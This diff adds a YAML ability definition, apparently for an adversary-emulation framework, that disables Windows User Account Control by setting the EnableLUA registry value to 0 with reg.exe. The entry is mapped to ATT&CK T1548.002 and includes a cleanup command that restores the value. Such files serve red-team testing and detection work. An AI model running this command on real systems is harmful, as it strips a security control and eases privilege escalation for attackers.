@@ -1,0 +1,22 @@
+---
+- id: 3a67bc42e7f567d9faffab9af37afa72
+  name: Disable UAC using reg.exe
+  description: 'Disable User Account Conrol (UAC) using the builtin tool reg.exe by
+    changing its registry key
+
+    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from
+    1 to 0
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      cmd:
+        command: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          /v EnableLUA /t REG_DWORD /d 0 /f
+        payloads: []
+        cleanup: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          /v EnableLUA /t REG_DWORD /d 1 /f
